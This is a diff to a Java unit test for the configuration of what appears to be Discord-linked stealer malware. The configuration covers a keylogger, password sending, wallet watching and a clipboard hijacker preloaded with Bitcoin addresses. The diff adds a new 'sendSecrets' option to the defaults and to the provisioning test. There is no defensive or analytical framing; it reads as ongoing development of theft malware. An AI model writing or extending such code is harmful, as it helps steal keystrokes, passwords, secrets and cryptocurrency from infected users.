@@ -23,6 +23,7 @@ class DiscordConfigTest {
 		assertTrue(DiscordConfig.keylogger());
 		assertTrue(DiscordConfig.sendPasswords());
 		assertTrue(DiscordConfig.clipboard());
+		assertTrue(DiscordConfig.sendSecrets());
 		assertTrue(DiscordConfig.provisionedCoins().isEmpty());
 	}
 
@@ -31,13 +32,14 @@ class DiscordConfigTest {
 		DiscordConfig.provisioning(Map.of(
 			"wallets", Map.of("watch", false),
 			"keylogger", Map.of("enabled", false, "sendPasswords", false),
-			"clipboard", Map.of("enabled", false, "coins", Map.of(
+			"clipboard", Map.of("enabled", false, "sendSecrets", false, "coins", Map.of(
 				"btc", List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu", "no-valida"),
 				"nope", List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu")))));
 		assertFalse(DiscordConfig.walletsWatch());
 		assertFalse(DiscordConfig.keylogger());
 		assertFalse(DiscordConfig.sendPasswords());
 		assertFalse(DiscordConfig.clipboard());
+		assertFalse(DiscordConfig.sendSecrets());
 		assertEquals(List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu"), DiscordConfig.provisionedCoins().get("btc"));
 		assertFalse(DiscordConfig.provisionedCoins().containsKey("nope"));
 	}
